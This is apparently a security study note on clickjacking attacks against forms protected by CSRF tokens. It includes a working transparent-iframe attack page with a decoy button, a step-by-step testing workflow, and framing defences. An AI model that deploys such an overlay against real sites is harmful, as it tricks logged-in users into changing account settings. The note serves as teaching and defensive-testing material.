# Clickjacking With CSRF Token Protection

## Overview

Clickjacking can still be possible when a sensitive action is protected by a CSRF token.

The important distinction is that the attacker does not necessarily need to know or obtain the token.

If the victim is already authenticated and the target page can be framed, the victim's browser can load the page containing the valid CSRF token and submit the action when the victim interacts with the framed interface.

---

# Core Concept

```text
Victim Logged In
       ↓
Target Page Loaded in iframe
       ↓
Target Form Contains Valid CSRF Token
       ↓
Iframe Hidden/Transparent
       ↓
Attacker Places Decoy
       ↓
Victim Clicks Decoy
       ↓
Target Form Submitted
       ↓
Authenticated Action Executes
```

---

# CSRF Token

A typical target form may contain:

```html
<input type="hidden" name="csrf" value="TOKEN">
```

The token is generated for the legitimate user session.

Normally, the application checks that:

```text
Submitted Token
       ↓
Matches Expected Token
```

---

# Why Clickjacking Can Still Work

In a normal CSRF attack, an attacker may need to construct a request without knowing the victim's CSRF token.

Clickjacking is different because the target form is loaded directly from the target website.

The victim's browser therefore receives the legitimate form and its associated token.

Conceptually:

```text
Target Page
     ↓
Generated for Victim Session
     ↓
Contains Valid CSRF Token
     ↓
Framed by Attacker Page
     ↓
Victim Clicks Target Control
```

The attacker does not necessarily need to read the token.

---

# Example Form

A target account page may contain:

```html
<form action="/my-account/change-email" method="POST">
    <input type="hidden" name="csrf" value="TOKEN">
    <input type="email" name="email">
    <button type="submit">Update email</button>
</form>
```

The target action is protected by:

```text
CSRF token
```

but may still be vulnerable to clickjacking if the page can be framed.

---

# Basic Attack Structure

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://victim-website.com/my-account"></iframe>
```

The target form remains inside the iframe.

---

# Victim Interaction

The victim sees:

```text
Click me
```

but the actual browser interaction occurs on the framed target page.

```text
Visible Decoy
     ↓
Victim Click
     ↓
Transparent iframe
     ↓
Update email button
     ↓
Form submitted
```

The form submission includes the valid CSRF token belonging to the victim's session.

---

# Conditions

A clickjacking attack against a CSRF-protected action generally requires:

```text
Target page can be framed
        +
Victim is authenticated
        +
Sensitive action is accessible through UI
        +
Target control can be aligned
```

---

# What the Attacker Does Not Need

The attacker does not necessarily need to know:

```text
Victim's CSRF token
```

The attacker can instead cause the victim's browser to interact with the legitimate framed page.

---

# Testing Workflow

## Step 1 — Identify Sensitive Action

Look for actions such as:

```text
Change email
Change account settings
Delete account
Update profile
```

---

## Step 2 — Inspect the Form

Use Burp Suite to inspect the target page.

Look for:

```html
<input type="hidden" name="csrf" value="...">
```

---

## Step 3 — Confirm Frameability

Inspect response headers for:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

---

## Step 4 — Create Iframe

Load the target page:

```html
<iframe src="https://victim-website.com/my-account"></iframe>
```

---

## Step 5 — Align Decoy

Use CSS to place the visible decoy over the target action.

During testing:

```css
opacity: 0.1;
```

can help with alignment.

---

## Step 6 — Hide Target

Once aligned:

```css
opacity: 0.0001;
```

can be used for the final demonstration.

---

## Step 7 — Deliver

In an authorized PortSwigger lab or permitted target, deliver the crafted page to the victim.

---

# Clickjacking vs Traditional CSRF

## Traditional CSRF

```text
Attacker
   ↓
Creates Cross-Origin Request
   ↓
Victim Browser
   ↓
Target Application
```

The attacker generally attempts to construct the request directly.

---

## Clickjacking

```text
Attacker Page
   ↓
Frames Target Page
   ↓
Victim Interacts With Framed UI
   ↓
Target Form Executes
```

The legitimate target page performs the action.

---

# Important Distinction

CSRF protection and clickjacking protection address different attack surfaces.

```text
CSRF Token
   ↓
Helps verify that a request originated from
an expected application context.
```

```text
Frame Protection
   ↓
Controls whether the page can be embedded
inside another page.
```

Therefore:

```text
CSRF Token
   ≠
Clickjacking Protection
```

---

# Defensive Perspective

A sensitive page should use appropriate framing protections.

Important mechanisms include:

```http
X-Frame-Options: DENY
```

or:

```http
X-Frame-Options: SAMEORIGIN
```

and CSP:

```http
Content-Security-Policy: frame-ancestors 'none';
```

or:

```http
Content-Security-Policy: frame-ancestors 'self';
```

---

# Testing Checklist

```text
☐ Identify sensitive action
☐ Confirm authentication requirement
☐ Identify CSRF token
☐ Confirm target page can be framed
☐ Check X-Frame-Options
☐ Check CSP frame-ancestors
☐ Load target page in iframe
☐ Use partial opacity during alignment
☐ Align decoy with target control
☐ Test victim interaction in authorized environment
☐ Confirm whether action executes
```

---

# Key Takeaways

- CSRF token protection does not automatically prevent clickjacking.
- The victim's browser can load the legitimate target page and its valid CSRF token.
- The attacker can position a decoy over the target form control.
- The victim's click can cause the protected action to execute.
- The target must generally be frameable for this technique.
- `X-Frame-Options` and CSP `frame-ancestors` provide important clickjacking defenses.